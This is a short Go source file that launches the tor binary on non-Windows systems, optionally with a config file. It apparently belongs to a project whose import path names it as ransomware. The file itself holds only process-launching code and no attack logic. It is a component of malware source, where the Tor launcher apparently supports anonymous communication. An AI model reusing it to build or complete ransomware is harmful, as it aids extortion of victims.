// +build !windows

package exe

import (
    "os/exec"

    "github.com/sug0/sr-ransomware/go/errors"
)

func (t *Tor) Start() error {
    if t.cmd != nil {
        return ErrAlreadyRunning
    }
    if t.config != "" {
        t.cmd = exec.Command("tor", "-f", t.config)
    } else {
        t.cmd = exec.Command("tor")
    }
    return errors.WrapIfNotNil(pkg, "failed to start tor", t.cmd.Start())
}
